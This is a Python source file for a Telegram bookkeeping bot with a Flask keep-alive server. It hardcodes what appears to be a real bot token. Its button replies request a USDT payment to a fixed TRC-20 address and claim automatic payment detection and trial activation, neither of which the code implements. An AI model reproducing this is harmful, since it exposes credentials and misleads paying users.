import os
import time
import requests
import asyncio
from flask import Flask, request, jsonify
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# ==================== 基础配置 ====================
ADMIN_ID = 8782394486  # 您的管理员ID
# 用于存储机器人授权时间和语言等设置（简易内存数据库）
BOT_DATA = {}

# ==================== Web 服务 (用于 Render 保活) ====================
app = Flask('')

@app.route('/')
def home():
    return "Your Bot Service Is Live!"

@app.route('/webhook', methods=['POST'])
def webhook():
    return "OK", 200

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# ==================== 核心辅助函数 ====================
def get_setting(gid, key):
    if gid not in BOT_DATA:
        BOT_DATA[gid] = {'language': 'chinese', 'usdt_visible': True, 'timezone': 'GMT+8'}
    return BOT_DATA[gid].get(key)

def get_help_text(lang='chinese'):
    return (
        "🤖 **记账机器人使用指南**\n\n"
        "📌 **记账格式：**\n"
        "+1000 - 入款1000元\n"
        "-1000 - 入款-1000元 (扣减款)\n"
        "备注+2000 - 带备注入款\n"
        "备注-2000 - 带备注减款\n"
        "下发50 - 下发50 USDT\n"
        "备注下发50 - 带备注下发50 USDT\n"
        "+0 - 查看今日汇总\n\n"
        "📌 **管理命令：**\n"
        "上课 - 开启记账模式（开始全新记账）\n"
        "下课 - 关闭记账模式（锁定并结束本轮，但不清除历史数据）\n"
        "设置汇率 7.2 - 设置汇率\n"
        "设置操作人 - 设置操作人（回复某人消息后发送）\n"
        "查看操作员列表 - 查看操作人列表\n"
        "改语言 - 切换语言（中文/缅甸语）\n"
        "设置时间 - 设置时区\n"
        "显示U - 显示USDT单位\n"
        "隐藏U - 隐藏USDT单位\n\n"
        "📌 **删除命令：**\n"
        "删今天 - 删除今日所有账单\n"
        "删最后 - 删除最后一笔账单\n"
        "全部清单 - 清空历史所有账单\n"
        "清单+备注 - 删除某人的账单 (例如: 清单+张三)"
    )

# ==================== 指令处理逻辑 ====================

# 🌟 重新编写的 /start 函数，确保私聊百分之百弹出 8 个控制按钮
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    gid = update.effective_chat.id
    chat_type = update.effective_chat.type
    lang = get_setting(gid, 'language') or 'chinese'
    
    # 1. 获取基础指南文本
    guide_text = get_help_text(lang)
    
    # 2. 判断如果是“私聊”，强制生成并挂载 8 个蓝色功能按钮
    if chat_type == "private":
        buttons = [
            [
                InlineKeyboardButton("🎁 试用", callback_data="buy_try"),
                InlineKeyboardButton("🚀 开始", callback_data="buy_start")
            ],
            [
                InlineKeyboardButton("📅 到期时间", callback_data="buy_time"),
                InlineKeyboardButton("🔄 自动续费", callback_data="buy_auto")
            ],
            [
                InlineKeyboardButton("📌 授权状态", callback_data="buy_status"),
                InlineKeyboardButton("🛠️ 账单重置", callback_data="buy_reset")
            ],
            [
                InlineKeyboardButton("📖 说明书", callback_data="buy_help"),
                InlineKeyboardButton("👤 联系技术", callback_data="buy_contact")
            ]
        ]
        keyboard = InlineKeyboardMarkup(buttons)
        
        private_suffix = (
            "\n\n━━━━━━━━━━━━━━━━━━━━\n"
            "👑 **【老板私聊控制面板】**\n"
            "检测到您正在私聊管理机器人，请使用下方按钮进行**充值续费**、**开通试用**或查看状态。"
        )
        
        await update.message.reply_text(
            text=guide_text + private_suffix, 
            parse_mode='Markdown', 
            reply_markup=keyboard
        )
    else:
        # 如果在群聊里，只发纯文字，不带按钮打扰群友
        await update.message.reply_text(guide_text, parse_mode='Markdown')

# 按钮点击事件处理
async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    # 当客户点击“自动续费”时，精确吐出收款账单和波场地址
    if query.data == "buy_auto":
        bill_text = (
            "🧾 **订单已创建！请在 2 小时内完成支付**\n\n"
            "💰 支付金额：`125.043` **USDT**\n"
            "📍 TRC-20网络地址：`TVnjLwDrGjYVRTa1ukfoE2mFTmCxtrjoCw`\n\n"
            "⚠️ **注意事项：**\n"
            "• 收款地址以 **rjoCw** 结尾，请仔细核对。\n"
            "• 请务必转入**带有尾数 (.043)** 的精准金额，否则系统无法自动识别延期。\n"
            "• 充值成功后，等待 3 分钟点击【📅 到期时间】按钮查看服务是否延期。"
        )
        await query.message.reply_text(bill_text, parse_mode='Markdown')
    
    elif query.data == "buy_time":
        await query.message.reply_text("📅 当前机器人服务有效期至：**无限期 (测试中)**", parse_mode='Markdown')
    
    elif query.data == "buy_try":
        await query.message.reply_text("🎁 已成功为您申请 3 天免费试用额度！现已激活群内记账功能。", parse_mode='Markdown')
        
    elif query.data == "buy_contact":
        await query.message.reply_text("👤 技术支持与人工客服：请联系大老板 @xiaochenfafacai", parse_mode='Markdown')
        
    else:
        await query.message.reply_text(f"已收到指令，正在处理后台逻辑...", parse_mode='Markdown')

# 系统管理员强制续费指令（群内或私聊打字：后台续费 30）
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text
    
    if uid == ADMIN_ID and text.startswith("后台续费"):
        try:
            days = text.split()[1]
            await update.message.reply_text(f"👑 尊贵的系统管理员：已成功为该机器人强制续费 {days} 天！")
        except:
            await update.message.reply_text("格式错误，正确格式如：`后台续费 30`")

# ==================== 主程序入口 ====================
def main():
    # 启动 Flask 保活网页
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()

    # 从环境变量获取 Token
    TOKEN = os.environ.get("TOKEN", "8915202728:AAGR4QS4_iYbwqR6nIE68N_pykVeoTBVBUA") # 替换成你的实际Token
    
    # 启动 Telegram 机器人
    app_tg = Application.builder().token(TOKEN).build()
    
    # 注册指令监听器
    app_tg.add_handler(CommandHandler("start", start_cmd))
    app_tg.add_handler(CallbackQueryHandler(button_click))
    app_tg.add_handler(MessageHandler(filters.TEXT & filters.Regex("^后台续费"), admin_command))
    
    print("🤖 记账发货机器人已全面启动...")
    app_tg.run_polling()

if __name__ == '__main__':
    main()
